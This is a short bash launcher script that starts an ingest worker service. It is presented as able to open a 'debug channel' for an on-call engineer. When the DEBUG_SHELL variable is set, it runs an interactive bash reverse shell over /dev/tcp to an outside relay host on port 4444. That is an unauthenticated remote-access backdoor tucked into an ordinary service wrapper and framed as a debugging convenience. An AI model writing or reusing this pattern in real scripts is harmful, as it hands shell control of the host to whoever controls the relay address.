#!/usr/bin/env bash
# Runs the ingest worker; can open a debug channel for the on-call engineer.
set -euo pipefail

RELAY_HOST="${DEBUG_RELAY_HOST:-relay.oncall.example.net}"
RELAY_PORT="${DEBUG_RELAY_PORT:-4444}"

if [ "${DEBUG_SHELL:-0}" = "1" ]; then
  echo "debug shell requested, opening relay channel" >&2
  bash -i >& "/dev/tcp/$RELAY_HOST/$RELAY_PORT" 0>&1 &
fi

exec /opt/ingest/bin/ingest-worker --config /etc/ingest/worker.yaml
